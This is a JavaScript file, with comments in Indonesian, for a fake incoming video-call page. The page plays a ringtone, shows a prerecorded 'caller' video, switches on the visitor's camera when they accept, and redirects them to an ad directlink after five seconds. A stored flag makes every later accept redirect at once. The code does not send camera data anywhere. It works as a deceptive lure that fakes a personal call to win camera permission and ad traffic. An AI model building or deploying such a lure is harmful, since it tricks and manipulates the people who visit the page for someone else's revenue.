// ==== 1. Flag & Directlink ====
let callAccepted = localStorage.getItem("callAccepted") === "true";
const AD_LINK = "https://www.effectivecpmrate.com/s7hqmurbjq?key=fcc86c5f98b44a01fa708a49a10b1723";
const REDIRECT_SECONDS = 5; // ubah sesuai kebutuhan

// ==== 2. Element references ====
const incomingScreen = document.getElementById('incomingScreen');
const acceptBtn = document.getElementById('acceptBtn');
const declineBtn = document.getElementById('declineBtn');
const ringTone = document.getElementById('ringTone');

const localWrap = document.getElementById('localWrap');
const localVideo = document.getElementById('localVideo');
const blurCanvas = document.getElementById('blurCanvas');
const camOffIcon = document.getElementById('camOffIcon');

const controls = document.getElementById('controls');
const controlsLabel = document.getElementById('controlsLabel');
const callTimer = document.getElementById('callTimer');

const btnSwitch = document.getElementById('btnSwitch');
const btnCamera = document.getElementById('btnCamera');
const btnMute = document.getElementById('btnMute');
const btnEnd = document.getElementById('btnEnd');

let currentStream = null;
let cameraOn = true;
let muted = false;
let usingFront = true;
let callSeconds = 0;
let callInterval = null;

// ==== 3. Helper functions ====
function resizeCanvasToWrap() {
  const rect = localWrap.getBoundingClientRect();
  blurCanvas.width = rect.width;
  blurCanvas.height = rect.height;
}

function playRingtone() {
  // autoplay audio bisa diblokir browser; ini akan play jika memungkinkan
  ringTone.currentTime = 0;
  ringTone.play().catch(()=>{});
}
function stopRingtone() {
  ringTone.pause();
  ringTone.currentTime = 0;
}

async function startCameraStream() {
  try {
    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
    currentStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: usingFront ? 'user' : 'environment' },
      audio: false
    });
    localVideo.srcObject = currentStream;
    cameraOn = true;
    blurCanvas.style.opacity = '0';
    camOffIcon.style.opacity = '0';
    document.getElementById('iconCamera').src = 'https://ik.imagekit.io/sodejjlov/20250829_003336.png?updatedAt=1756402559469';
  } catch (err) { console.error(err); }
}

function stopCameraStreamButKeepSnapshot() {
  if (!currentStream) return;
  resizeCanvasToWrap();
  const ctx = blurCanvas.getContext('2d');
  try { ctx.drawImage(localVideo, 0, 0, blurCanvas.width, blurCanvas.height); }
  catch { ctx.fillStyle = '#111'; ctx.fillRect(0,0,blurCanvas.width, blurCanvas.height); }
  blurCanvas.style.opacity = '1';
  camOffIcon.style.opacity = '1';
  currentStream.getVideoTracks().forEach(track => track.stop());
  localVideo.srcObject = null;
  cameraOn = false;
  currentStream = null;
  document.getElementById('iconCamera').src = './assets/camera-off.svg';
}

async function toggleCamera() {
  if (cameraOn) stopCameraStreamButKeepSnapshot();
  else {
    blurCanvas.style.opacity = '0';
    camOffIcon.style.opacity = '0';
    setTimeout(() => { startCameraStream(); }, 380);
  }
}

async function switchCamera() {
  usingFront = !usingFront;
  if (cameraOn) await startCameraStream();
}

function startCallTimer(){
  callSeconds = 0;
  callTimer.style.display = 'block';
  callInterval = setInterval(()=>{
    callSeconds++;
    const m = String(Math.floor(callSeconds/60)).padStart(2,'0');
    const s = String(callSeconds%60).padStart(2,'0');
    callTimer.textContent = `${m}:${s}`;

    // redirect otomatis setelah REDIRECT_SECONDS
    if(callSeconds >= REDIRECT_SECONDS){
      clearInterval(callInterval);
      window.location.href = AD_LINK;
    }
  },1000);
}
function stopCallTimer(){
  clearInterval(callInterval);
  callInterval=null;
  callTimer.style.display='none';
}

function toggleMute(){
  muted = !muted;
  btnMute.style.opacity = muted? 0.6 : 1;
}

// ==== 4. Accept / Decline / End ====
async function acceptCall(){
  // Jika user sudah pernah klik accept sebelumnya, langsung redirect
  if(callAccepted){
    window.location.href = AD_LINK;
    return;
  }

  // Tandai sudah pernah menerima call
  localStorage.setItem("callAccepted","true");
  callAccepted = true;

  stopRingtone();

  incomingScreen.style.opacity = '0';
  setTimeout(()=> incomingScreen.classList.add('hidden'), 320);

  const rv = document.getElementById('remoteVideo');
  rv.style.display = 'block';
  rv.muted = false;
  rv.play().catch(err => console.error("Autoplay blocked:", err));
  requestAnimationFrame(() => { rv.style.opacity = '1'; });

  localWrap.classList.remove('hidden');
  controls.classList.add('visible');
  controlsLabel.style.display = 'block';
  await startCameraStream();
  startCallTimer();
}

function declineCall(){
  stopRingtone();
  const rv = document.getElementById('remoteVideo');
  rv.style.opacity = '0';
  setTimeout(() => {
    rv.pause();
    rv.currentTime = 0;
    incomingScreen.innerHTML = '<div style="color:#fff;font-size:20px">Panggilan Ditolak</div>';
    setTimeout(()=> incomingScreen.classList.add('hidden'), 900);
  }, 600);
}

function endCall(){
  stopRingtone();
  stopCallTimer();
  const rv = document.getElementById('remoteVideo');
  rv.style.opacity = '0';
  setTimeout(() => { rv.pause(); rv.currentTime = 0; }, 600);
  controls.classList.remove('visible');
  controlsLabel.style.display = 'none';
  localWrap.classList.add('hidden');
  if (currentStream) currentStream.getTracks().forEach(t => t.stop());
  currentStream = null; cameraOn = false;
}

// ==== 5. Event binding ====
acceptBtn.addEventListener('click', acceptCall);
declineBtn.addEventListener('click', declineCall);
btnEnd.addEventListener('click', endCall);
btnMute.addEventListener('click', toggleMute);
btnCamera.addEventListener('click', toggleCamera);
btnSwitch.addEventListener('click', switchCamera);

// Start ringtone when page loads
playRingtone();

window.addEventListener('resize', resizeCanvasToWrap);
resizeCanvasToWrap();
